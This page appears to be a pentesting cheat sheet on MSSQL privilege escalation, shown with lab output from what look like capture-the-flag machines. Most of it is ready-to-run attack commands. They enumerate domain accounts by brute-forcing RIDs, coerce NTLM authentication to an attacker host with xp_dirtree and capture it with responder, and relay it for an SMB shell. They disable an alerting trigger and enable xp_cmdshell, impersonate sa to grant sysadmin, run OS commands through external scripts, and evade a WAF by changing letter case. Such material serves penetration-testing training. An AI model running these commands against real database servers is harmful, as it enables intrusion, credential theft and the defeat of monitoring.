---
title: "MSSQL Privilege Escalation"
date: 2025-7-17
tags: ["Hash Cracking", "Privilege Escalation", "Ntlm", "MSSQL", "Database", "Windows", "RCE", "Enum", "Domain Users", "SID", "NTLM Relay"]
---

### Enum

{{< tab set1 tab1 >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 1. List Users that Can be Impersonated

```console
nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M enum_impersonate
```

```console {class="sample-code"}
$ nxc mssql DC.REDELEGATE.VL -u 'SQLGuest' -p 'zDPBpaF4FywlqIv11vii' --local-auth -M enum_impersonate
MSSQL       10.129.254.242  1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
MSSQL       10.129.254.242  1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii 
ENUM_IMP... 10.129.254.242  1433   DC               [-] No users with impersonation rights found.
```

#### 2. Enumerate Active MSSQL Logins

```console
nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M enum_logins
```

```console {class="sample-code"}
$ nxc mssql DC.REDELEGATE.VL -u 'SQLGuest' -p 'zDPBpaF4FywlqIv11vii' --local-auth -M enum_logins     
MSSQL       10.129.254.242  1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
MSSQL       10.129.254.242  1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii 
ENUM_LOGINS 10.129.254.242  1433   DC               [+] Logins found:
ENUM_LOGINS 10.129.254.242  1433   DC               [*]   - sa
ENUM_LOGINS 10.129.254.242  1433   DC               [*]   - SQLGuest
```

#### 3. Enumerate Linked MSSQL Servers

```console
nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M enum_links
```

```console {class="sample-code"}
$ nxc mssql DC.REDELEGATE.VL -u 'SQLGuest' -p 'zDPBpaF4FywlqIv11vii' --local-auth -M enum_links 
MSSQL       10.129.254.242  1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
MSSQL       10.129.254.242  1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii 
ENUM_LINKS  10.129.254.242  1433   DC               [+] Linked servers found:
ENUM_LINKS  10.129.254.242  1433   DC               [*]   - WIN-Q13O908QBPG\SQLEXPRESS
```

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 1. Import Module

```console
. .\PowerUpSQL.ps1
```

#### 2. Audit

```console
Invoke-SQLAudit -Instance <TARGET> -Username '<USER>' -Password '<PASSWORD>' -Verbose
```

#### 3. Execute Query

```console
Get-SQLQuery -Instance <TARGET> -Username '<USER>' -Password '<PASSWORD>' -Query "<QUERY>" -Verbose
```

<small>*Ref: [PowerUpSQL.ps1](https://github.com/NetSPI/PowerUpSQL/blob/master/PowerUpSQL.ps1)*</small>

{{< /tabcontent >}}

---

### Domain Users Enum

{{< tab set2 tab1 >}}Linux{{< /tab >}}
{{< tab set2 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set2 tab1 >}}
{{< tab set2-1 tab1 >}}Manual{{< /tab >}}{{< tab set2-1 tab2 >}}nxc{{< /tab >}}{{< tab set2-1 tab3 >}}Metasploit{{< /tab >}}
{{< tabcontent set2-1 tab1 >}}

#### 1. Get Domain Name

```console
SELECT DEFAULT_DOMAIN();
```

```console {class="sample-code"}
SQL (SQLGuest  guest@master)> SELECT DEFAULT_DOMAIN();
             
----------   
REDELEGATE
```

#### 2. Get Hex SID

```console
SELECT master.dbo.fn_varbintohexstr(SUSER_SID('<DOMAIN>\Domain Admins'));
```

```console {class="sample-code"}
SQL (SQLGuest  guest@master)> SELECT master.dbo.fn_varbintohexstr(SUSER_SID('REDELEGATE\Domain Admins'));
                                                             
----------------------------------------------------------   
0x010500000000000515000000a185deefb22433798d8e847a00020000
```

#### 3. Convert Hex SID to Readable String (Powershell)

```console
# Without `0x`
$hexSid = "<HEX_SID>"
$sidBytes = [byte[]]::new($hexSid.Length / 2)
for ($i = 0; $i -lt $hexSid.Length; $i += 2) {
    $sidBytes[$i / 2] = [Convert]::ToByte($hexSid.Substring($i, 2), 16)
}
$sid = New-Object System.Security.Principal.SecurityIdentifier($sidBytes, 0)
$sid.Value
```

```console {class="sample-code"}
PS C:\Users\john> $hexSid = "010500000000000515000000a185deefb22433798d8e847a00020000"
PS C:\Users\john> $sidBytes = [byte[]]::new($hexSid.Length / 2)
PS C:\Users\john> for ($i = 0; $i -lt $hexSid.Length; $i += 2) {
>>     $sidBytes[$i / 2] = [Convert]::ToByte($hexSid.Substring($i, 2), 16)
>> }
PS C:\Users\john> $sid = New-Object System.Security.Principal.SecurityIdentifier($sidBytes, 0)
PS C:\Users\john> $sid.value
S-1-5-21-4024337825-2033394866-2055507597-512
```

#### 4. Domain Users Enum

```console
#!/bin/bash

USERNAME="<USER>"
PASSWORD="<PASSWORD>"
SERVER="<TARGET>"
SID_BASE="<SID_BASE>"

query_sid() {
    local sid="$1"
    local full_sid="${SID_BASE}-${sid}"
    local sql="SELECT SUSER_SNAME(SID_BINARY(N'$full_sid'))"

    echo "$sql" | impacket-mssqlclient "$USERNAME:$PASSWORD@$SERVER" -file /dev/stdin 2>/dev/null | grep -a REDELEGATE
}

for sid in {1100..1200}; do
    query_sid "$sid"
done
```

```console {class="sample-code"}
$ ./domain_users_enum.sh   
REDELEGATE\FS01$   
REDELEGATE\Christine.Flanders   
REDELEGATE\Marie.Curie   
---[SNIP]---
```

{{< /tabcontent >}}
{{< tabcontent set2-1 tab2 >}}

#### 1. Domain Users Enum

```console
nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth --rid-brute
```

```console {class="sample-code"}
$ nxc mssql DC.REDELEGATE.VL -u 'SQLGuest' -p 'zDPBpaF4FywlqIv11vii' --local-auth --rid-brute
MSSQL       10.129.254.242  1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
MSSQL       10.129.254.242  1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii 
MSSQL       10.129.254.242  1433   DC               498: REDELEGATE\Enterprise Read-only Domain Controllers
MSSQL       10.129.254.242  1433   DC               500: WIN-Q13O908QBPG\Administrator
---[SNIP]---
```

{{< /tabcontent >}}
{{< tabcontent set2-1 tab3 >}}

#### 1. Metasploit

```console
msfconsole
```

#### 2. Use Module

```console
use auxiliary/admin/mssql/mssql_enum_domain_accounts
```

#### 3. Set Params

```console
set RHOST <TARGET>
```

```console {class="sample-code"}
msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts) > set RHOST 10.129.234.50
RHOST => 10.129.234.50
```

```console
set RPORT <PORT>
```

```console {class="sample-code"}
msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts) > set RPORT 1433
RPORT => 1433
```

```console
set USERNAME <USER>
```

```console {class="sample-code"}
msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts) > set USERNAME SQLGuest
USERNAME => SQLGuest
```

```console
set PASSWORD <PASSWORD>
```

```console {class="sample-code"}
msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts) > set PASSWORD zDPBpaF4FywlqIv11vii
PASSWORD => zDPBpaF4FywlqIv11vii
```

```console
set fuzznum 10000
```

```console {class="sample-code"}
msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts) > set fuzznum 10000
fuzznum => 10000
```

#### 4. Domain Users Enum

```console
run
```

```console {class="sample-code"}
msf6 auxiliary(admin/mssql/mssql_enum_domain_accounts) > run
[*] Running module against 10.129.234.50
[*] 10.129.234.50:1433 - Attempting to connect to the database server at 10.129.234.50:1433 as SQLGuest...
[+] 10.129.234.50:1433 - Connected.
[*] 10.129.234.50:1433 - SQL Server Name: WIN-Q13O908QBPG
[*] 10.129.234.50:1433 - Domain Name: REDELEGATE
[+] 10.129.234.50:1433 - Found the domain sid: 010500000000000515000000a185deefb22433798d8e847a
[*] 10.129.234.50:1433 - Brute forcing 10000 RIDs through the SQL Server, be patient...
[*] 10.129.234.50:1433 -  - WIN-Q13O908QBPG\Administrator
[*] 10.129.234.50:1433 -  - REDELEGATE\Guest
[*] 10.129.234.50:1433 -  - REDELEGATE\krbtgt
[*] 10.129.234.50:1433 -  - REDELEGATE\Domain Admins
---[SNIP]---
```

{{< /tabcontent >}}
{{< /tabcontent >}}
{{< tabcontent set2 tab2 >}}

#### 1. Import Module

```console
Import-Module .\Get-SqlServer-Enum-WinAccounts.psm1
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\programdata> Import-Module .\Get-SqlServer-Enum-WinAccounts.psm1
Warning: Some imported command names contain one or more of the following restricted characters: # , ( ) {{ }} [ ] & - / \ $ ^ ; : " ' < > | ? @ ` * % + = ~
```

#### 2. Domain Users Enum

```console
Get-SqlServer-Enum-WinAccounts -SQLServerInstance '<TARGET>' -SqlUser '<USER>' -SqlPass '<PASSWORD>' –FuzzNum 10000
```

```console {class="sample-code"}
*Evil-WinRM* PS C:\programdata> Get-SqlServer-Enum-WinAccounts -SQLServerInstance "10.129.234.50" -SqlUser 'SQLGuest' -SqlPass 'zDPBpaF4FywlqIv11vii' –FuzzNum 10000
[*] Attempting to authenticate to 10.129.234.50 as the login SQLGuest...
[*] Connected.
[*] Enumerating domain...
[*] Domain found: REDELEGATE
[*] Enumerating domain SID...
[*] Domain SID found: 010500000000000515000000A185DEEFB22433798D8E847A
[*] Brute forcing 10000 RIDs...
[*] - WIN-Q13O908QBPG\Administrator
[*] - REDELEGATE\Guest
[*] - REDELEGATE\krbtgt
[*] - REDELEGATE\Domain Guests
---[SNIP]---
[*] 34 domain accounts / groups were found.

name
----
REDELEGATE\Allowed RODC Password Replication Group
REDELEGATE\Cert Publishers
REDELEGATE\Christine.Flanders
---[SNIP]---
```

<small>*Ref: [Get-SqlServer-Enum-WinAccounts.psm1](https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Get-SqlServer-Enum-WinAccounts.psm1)*</small>

{{< /tabcontent >}}

---

### Abuse #1: Steal NTLM hash

#### 1. Start a Listener

```console
sudo responder -I tun0
```

#### 2. Coercing Authentication

{{< tab set3 tab1 >}}nxc{{< /tab >}}
{{< tab set3 tab2 >}}SQL{{< /tab >}}
{{< tabcontent set3 tab1 >}}

```console
nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M mssql_coerce -o L=<LOCAL_IP>
```

```console {class="sample-code"}
$ nxc mssql DC.REDELEGATE.VL -u 'SQLGuest' -p 'zDPBpaF4FywlqIv11vii' --local-auth -M mssql_coerce -o L=10.10.14.56
MSSQL       10.129.254.242  1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
MSSQL       10.129.254.242  1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii 
MSSQL_CO... 10.129.254.242  1433   DC               [*] Commands executed successfully, check the listener for results
```

{{< /tabcontent >}}
{{< tabcontent set3 tab2 >}}

```console
# Method 1
use master; exec xp_dirtree '\\<LOCAL_IP>\any\thing';
```

```console
# Method 2
load_file('\\<LOCAL_IP>\any\thing');
```

{{< /tabcontent >}}

---

### Abuse #2: NTLM Relay Attack

#### 1. Check if SMB Signing is False

```console
nxc smb <TARGET> -u '<USER>' -p '<PASSWORD>' -d <DOMAIN>
```

```console {class="sample-code"}
$ nxc smb MS01.example.com -u 'dev01' -p 'Initial123' -d example.com
SMB         10.10.132.54    445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:example.com) (signing:False) (SMBv1:False)
```

#### 2. Start a NTLM Relay Server \[Cannot Relay to Host itself\]

```console
impacket-ntlmrelayx --no-http-server -smb2support -t <TARGET_DOMAIN> -i
```

```console {class="sample-code"}
$ impacket-ntlmrelayx --no-http-server -smb2support -t DC01.example.com -i
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client RPC loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay disabled

[*] Servers started, waiting for connections
[*] SMBD-Thread-4 (process_request_thread): Received connection from 10.10.132.54, attacking target smb://DC01.example.com
[*] Authenticating against smb://DC01.example.com as REFLECTION/SVC_WEB_STAGING SUCCEED
[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
```

#### 3. Coercing Authentication

{{< tab set4 tab1 >}}nxc{{< /tab >}}
{{< tab set4 tab2 >}}SQL{{< /tab >}}
{{< tabcontent set4 tab1 >}}

```console
nxc mssql <TARGET> -u '<USER>' -p '<PASSWORD>' --local-auth -M mssql_coerce -o L=<LOCAL_IP>
```

```console {class="sample-code"}
$ nxc mssql DC.REDELEGATE.VL -u 'SQLGuest' -p 'zDPBpaF4FywlqIv11vii' --local-auth -M mssql_coerce -o L=10.10.14.56
MSSQL       10.129.254.242  1433   DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:redelegate.vl)
MSSQL       10.129.254.242  1433   DC               [+] DC\SQLGuest:zDPBpaF4FywlqIv11vii 
MSSQL_CO... 10.129.254.242  1433   DC               [*] Commands executed successfully, check the listener for results
```

{{< /tabcontent >}}
{{< tabcontent set4 tab2 >}}

```console
# Method 1
use master; exec xp_dirtree '\\<LOCAL_IP>\any\thing';
```

```console
# Method 2
load_file('\\<LOCAL_IP>\any\thing');
```

{{< /tabcontent >}}

#### 4. Interactive SMB Shell

```console
nc 127.0.0.0 <LOCAL_PORT>
```

```console {class="sample-code"}
$ nc 127.0.0.1 11000                  
Type help for list of commands
# shares
ADMIN$
C$
IPC$
NETLOGON
SYSVOL
# 
```

---

### Abuse #3: Run xp_cmdshell

#### 1. Check Any Policy Blocking xp_cmdshell \[Optional\]

```console
select name from sys.server_triggers;
```

#### 2. Disable Trigger if Any \[Optional\]

```console
disable trigger ALERT_xp_cmdshell on all server;
```

#### 3. Enable xp_cmdshell

```console
enable_xp_cmdshell;
```

#### 4. RCE

```console
xp_cmdshell powershell.exe -ep bypass <CMD>
```

---

### Abuse #4: Impersonate sa to run xp_cmdshell

#### 1. Add User to Sysadmin

```console
execute as login = 'sa'; exec sp_addsrvrolemember '<USER>','sysadmin'
```

#### 2. Check

```console
SELECT is_srvrolemember('sysadmin');
```

#### 3. Enable xp_cmdshell

```console
execute as login = 'sa'; exec sp_configure 'show advanced options', 1;
```

```console
execute as login = 'sa'; reconfigure;
```

```console
execute as login = 'sa'; exec sp_configure 'xp_cmdshell', 1;
```

```console
execute as login = 'sa'; reconfigure;
```

#### 4. RCE

```console
execute as login = 'sa'; EXEC master..xp_cmdshell 'powershell.exe -ep bypass <CMD>'
```

<small>*Note: try xp_cmDshElL to bypass WAF*</small>

---

### Abuse #5: Run External Script

#### 1. Run External Script (Python)

```console
EXEC sp_execute_external_script @language =N'Python', @script = N'import os; os.system("<CMD>");';
```
